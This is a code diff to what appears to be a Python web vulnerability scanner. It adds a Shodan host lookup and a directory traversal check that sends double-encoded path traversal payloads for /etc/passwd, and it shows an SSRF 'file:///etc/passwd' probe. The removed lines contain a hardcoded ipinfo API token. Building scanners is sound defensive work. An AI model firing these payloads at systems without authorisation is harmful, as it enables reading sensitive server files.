@@ -3,6 +3,7 @@ from urllib.parse import urlparse
 import dns.resolver
 import requests
 import vulners
+import shodan
 import base64
 import socket
 import json
@@ -21,7 +22,6 @@ class Scanner:
             "domain_information": self.domain_information(url),
             "port_discovery": self.port_discovery(url),
             "dns_record": self.dns_record(url),
-            "request_tamp": self.request_tamp(url),
             "exploit_info": self.exploit_info(url),
             "mitigation_info": self.mitigation_info(url)
         }
@@ -36,15 +36,17 @@ class Scanner:
     def domain_information(self,url):
         domain = urlparse(url).netloc
         ip = socket.gethostbyname(domain)
-        IP_INFO_API = "bd9a656f7652f9"
-        host = f"https://ipinfo.io/{ip}?token={IP_INFO_API}"
-        headers = {
-            'Content-Type':'application/json'
-        }
-        req = requests.get(host,headers=headers)
-        info = json.dumps(req.json())
 
-        return info
+        SKey = self.params['s_key']
+        SApi = shodan.Shodan(SKey)
+
+        info = json.dumps(SApi.host(ip))
+
+        os.system('touch output_domain_info.json')
+        with open('output_domain_info.json','w') as domainInfo:
+            domainInfo.writelines(info)
+
+        return 'Visit /domain'
 
     def port_discovery(self,url):
         domain = urlparse(url).netloc
@@ -77,8 +79,9 @@ class Scanner:
         test5 = Scanner.test_lfi(url)
         test6 = Scanner.test_cmdi(url)
         test7 = Scanner.test_ssrf(url)
+        test8 = Scanner.test_dtraversal(url)
 
-        return f"{test1} , {test2} , {test3}, {test4}, {test5}, {test6}, {test7}"
+        return f"{test1} , {test2} , {test3}, {test4}, {test5}, {test6}, {test7}, {test8}"
 
     def scan_for_server_version(self, url):
         req = requests.get(url)
@@ -87,8 +90,16 @@ class Scanner:
 
         return server
 
-    def request_tamp(self, url):
-        return "Under Development"
+    """def history_information(self, url):
+        domain = urlparse(url).netloc
+        ip = socket.gethostbyname(domain)
+
+        SKey = self.params['s_key']
+        SApi = shodan.Shodan(SKey)
+
+        info = json.dumps(SApi.host(ip))
+
+        return info"""
     
     def exploit_info(self,url):
         req = requests.get(url)
@@ -268,6 +279,21 @@ class Scanner:
                 return "LFI(Local File Inclusion)"
             else:
                 return ""
+
+    def test_dtraversal(url):
+        payload1 = "/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"
+        payload2 = "/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/etc/passwd"
+        fattempt = f"{url}{payload1}"
+        sattempt = f"{url}{payload2}"
+        req1 = requests.get(fattempt)
+        req2 = requests.get(sattempt)
+        if req1.status_code == 200 and req2.status_code == 200:
+            if 'root:x:' in req1.text or 'root:x:' in req2.text:
+                return 'Directory Path Traversal'
+            else:
+                return ''
+        else:
+            return ''
     
     def test_ssrf(url):
         payload1 = "file:///etc/passwd"
